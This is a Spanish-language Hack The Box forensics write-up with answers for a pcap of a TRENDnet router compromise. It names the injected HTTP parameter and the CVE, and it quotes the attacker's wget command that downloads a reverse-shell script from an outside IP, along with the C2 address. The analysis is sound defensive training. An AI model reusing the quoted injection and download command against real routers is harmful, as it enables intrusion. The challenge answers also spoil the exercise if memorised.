# Hack The Box - Trent (Forensics)  
**Archivo analizado:** `trent.pcap`  
**Herramientas usadas:** Wireshark, NetworkMiner, navegador web  

---

## üïµÔ∏è‚Äç‚ôÇÔ∏è An√°lisis de las Tareas

### ‚úÖ Task 1
**Pregunta:** From what IP address did the attacker initially launched their activity?  
**Respuesta:** `192.168.10.2`  
**M√©todo:** Se identific√≥ la primera IP que inici√≥ tr√°fico HTTP hacia el router (`192.168.10.1`) usando Wireshark. Se filtraron las peticiones `POST` relacionadas con el portal de administraci√≥n para detectar el inicio de la actividad maliciosa.

---

### ‚úÖ Task 2
**Pregunta:** What is the model name of the compromised router?  
**Respuesta:** `TEW-827DRU`  
**M√©todo:** Extra√≠do del contenido HTML (`adm_status.asp`) o desde cabeceras HTTP analizadas con NetworkMiner o Wireshark.

---

### ‚úÖ Task 3
**Pregunta:** How many failed login attempts did the attacker try before successfully logging into the router?  
**Respuesta:** `2`  
**M√©todo:** Se contaron dos intentos fallidos de inicio de sesi√≥n (`POST`) antes del login exitoso. Es importante revisar los estados de respuesta HTTP para determinar si el servicio acept√≥ o rechaz√≥ las credenciales en cada intento.

---

### ‚úÖ Task 4
**Pregunta:** At what UTC time did the attacker successfully log into the router‚Äôs web admin interface?  
**Respuesta:** `2024-05-01 15:53:27`  
**M√©todo:** Se identific√≥ el `POST` exitoso en Wireshark. Al hacer doble clic en el paquete correspondiente se puede ver la hora exacta (en UTC) del inicio de sesi√≥n.

---

### ‚úÖ Task 5
**Pregunta:** How many characters long was the password used to log in successfully?  
**Respuesta:** `0`  
**M√©todo:** Desde el mismo paquete observado en la pregunta anterior, se accede al contenido del `POST` y se verifica que el campo `log_pass` est√° vac√≠o. Esto confirma que no se utiliz√≥ ninguna contrase√±a.

---

### ‚úÖ Task 6
**Pregunta:** What is the current firmware version installed on the compromised router?  
**Respuesta:** `2.10`  
**M√©todo:** Visible en el archivo HTML `adm_status.asp` que puede ser recuperado desde Wireshark o extra√≠do m√°s f√°cilmente con NetworkMiner.

---

### ‚úÖ Task 7
**Pregunta:** Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?  
**Respuesta:** `usbapps.config.smb_admin_name`  
**M√©todo:** Se detect√≥ manipulaci√≥n del par√°metro en un `POST` con c√≥digo malicioso inyectado para lograr ejecuci√≥n remota de comandos.

---

### ‚úÖ Task 8
**Pregunta:** What is the CVE number associated with the vulnerability that was exploited in this attack?  
**Respuesta:** `CVE-2024-28353`  
**M√©todo:** Identificado a partir del modelo del router, versi√≥n del firmware y la t√©cnica de explotaci√≥n utilizada (RCE v√≠a par√°metros HTTP).

---

### ‚úÖ Task 9
**Pregunta:** What was the first command the attacker executed by exploiting the vulnerability?  
**Respuesta:** `whoami`  
**M√©todo:** Observado como el primer payload enviado tras lograr la ejecuci√≥n remota mediante inyecci√≥n en el par√°metro vulnerable.

---

### ‚úÖ Task 10
**Pregunta:** What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?  
**Respuesta:** `wget http://35.159.25.253:8000/a1l4m.sh`  
**M√©todo:** El comando fue enviado como parte del payload en el `POST` al router para descargar el script malicioso desde un servidor externo.

---

### ‚úÖ Task 11
**Pregunta:** What response message did the server return after the actor made a typo in the injection?  
**Respuesta:** `Access to this resource is forbidden`  
**M√©todo:** Al inspeccionar los `POST` fallidos con errores de sintaxis, se identific√≥ una respuesta HTTP con ese mensaje, indicando denegaci√≥n de acceso por parte del servidor.

---

### ‚úÖ Task 12
**Pregunta:** What was the IP address and port number of the C2 server? (IP:Port)  
**Respuesta:** `35.159.25.253:41143`  
**M√©todo:** Se encontr√≥ al revisar la IP destino y el puerto utilizados en la conexi√≥n reverse shell, visibles en el script `a1l4m.sh` descargado por el atacante o directamente en los paquetes de red.

---

## üß∞ Herramientas recomendadas
- **Wireshark**: para filtrar y analizar tr√°fico `http.request.method == "POST"` o contenido con palabras clave como `login`.
- **NetworkMiner**: para extraer archivos HTML y reconstruir sesiones HTTP.
- **Navegador web**: para visualizar archivos HTML como `adm_status.asp` y obtener informaci√≥n sobre el modelo del router o versi√≥n de firmware.

---

